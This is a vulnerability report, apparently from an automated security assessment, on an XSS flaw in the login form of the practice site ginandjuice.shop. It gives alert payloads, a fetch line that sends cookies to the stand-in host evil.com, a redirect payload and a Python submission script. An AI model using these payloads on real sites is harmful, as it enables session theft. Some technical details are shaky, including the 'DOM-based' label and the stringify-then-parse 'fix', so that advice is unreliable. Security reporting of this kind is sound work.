# DOM-based Cross-Site Scripting (XSS) in Login Form Username Parameter

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-01-31 14:56:12 UTC
**Target:** https://ginandjuice.shop/login
**Endpoint:** /login
**Method:** POST
**CVSS:** 9.6

## Description

Critical DOM-based XSS vulnerability discovered in the login form username parameter. The application takes user input from the username field and directly assigns it to a JavaScript variable without proper sanitization or context-aware escaping. While server-side HTML encoding is applied (< and >), the encoded content is then placed in a JavaScript string context, allowing attackers to break out of the string and execute arbitrary JavaScript.

## Impact

Attackers can execute arbitrary JavaScript in the context of the victim's browser, enabling complete compromise of user sessions, theft of authentication cookies, credential harvesting, redirection to malicious sites, and delivery of further client-side attacks. This affects all users who interact with the login form, including administrators.

## Technical Analysis

The vulnerability occurs in the login form processing where user input from the username parameter is HTML-encoded on the server side but then rendered in JavaScript context:

```javascript
var username = 'USER_INPUT_HERE';
document.getElementById('usernameInput').value = username;
```

The server applies HTML encoding (<script> becomes &lt;script&gt;) but this encoding is ineffective in JavaScript string context. Attackers can break out of the string using single quotes and semicolons, then inject arbitrary JavaScript.

The vulnerable code flow:
1. User submits form with malicious username
2. Server applies HTML encoding to prevent XSS
3. Server renders response with encoded content in JavaScript variable assignment
4. Browser executes JavaScript, allowing string breakout and code injection

Vulnerable payload: `';alert('XSS');//` results in:
```javascript
var username = ''';alert('XSS');//';
```

Which executes the alert function.

## Proof of Concept

1. Navigate to https://ginandjuice.shop/login
2. Enter the payload `';alert('XSS_POC');` into the username field
3. Submit the form
4. The JavaScript alert will execute, demonstrating XSS
5. View page source to see the vulnerable JavaScript assignment

Alternative payloads for data exfiltration:
- `';alert(document.cookie);//` - Steal session cookies
- `';fetch('//evil.com/steal?c='+document.cookie);//` - Exfiltrate data
- `';window.location='https://evil.com';` - Redirect victim

```
import requests
import re

def exploit_xss():
    session = requests.Session()
    
    # Get login page and CSRF token
    login_page = session.get("https://ginandjuice.shop/login")
    csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
    csrf_token = csrf_match.group(1) if csrf_match else None
    
    # XSS payload to break out of JavaScript string and execute code
    xss_payload = "';alert('XSS_SUCCESSFUL');document.title='PWND';"
    
    # Submit form with XSS payload
    form_data = {
        'csrf': csrf_token,
        'username': xss_payload
    }
    
    response = session.post("https://ginandjuice.shop/login", data=form_data)
    
    if response.status_code == 200:
        print("XSS payload submitted successfully!")
        print("Check browser for alert popup and title change")
        
        # Verify payload is in JavaScript context
        if "var username = '" in response.text and xss_payload in response.text:
            print("XSS payload injected into JavaScript context")
            return True
    
    return False

if __name__ == "__main__":
    exploit_xss()
```

## Remediation

1. Implement proper context-aware output encoding:
   - Use JavaScript string escaping for content placed in JavaScript variables
   - Escape single quotes, backslashes, newlines, and other special characters
   - Consider using JSON.stringify() for safe JavaScript variable assignment

2. Input validation:
   - Validate username format (alphanumeric, limited characters)
   - Reject input containing quotes, semicolons, or JavaScript keywords
   - Implement allowlist rather than blocklist approach

3. Content Security Policy (CSP):
   - Implement strict CSP headers to restrict script execution
   - Use nonces or hashes for approved scripts only

4. Secure coding practices:
   - Avoid placing user input directly in JavaScript context
   - Use template engines with automatic escaping
   - Implement security-focused code review processes

5. Example fix:
```javascript
// Safe approach using JSON encoding
var username = JSON.stringify(userData.username);
document.getElementById('usernameInput').value = JSON.parse(username);
```

